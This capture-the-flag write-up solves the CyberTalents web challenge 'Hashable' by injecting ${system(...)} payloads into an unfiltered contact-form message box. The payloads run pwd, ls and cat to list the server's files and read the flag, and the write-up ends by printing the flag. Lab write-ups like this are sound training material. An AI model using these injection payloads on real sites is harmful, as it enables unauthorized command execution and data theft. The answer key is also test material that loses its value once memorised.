# Challenge Name:
 [*Hashable*](https://cybertalents.com/challenges/web/hashable)
 
# Challenge Description
A famous enterprise blog was hacked, can you figure out how it was hacked?

Link: [ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/hashable/](ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/hashable/)

## Answer
* We must try in every user input field (URL and contact page)
* Try some special characters in the textboxes it doesn't filtered
* Try to injuct code in massager box 
```
${system('pwd')}
```
* It works so now get files list
```
${system('ls')}
```
* Open flag text file
```
${system('cat flag_23894ABCX1.txt')}
```
* You got the flag!!

 ## The Flag
 > 18ab51f960bd149bcb2497b9998c752c 
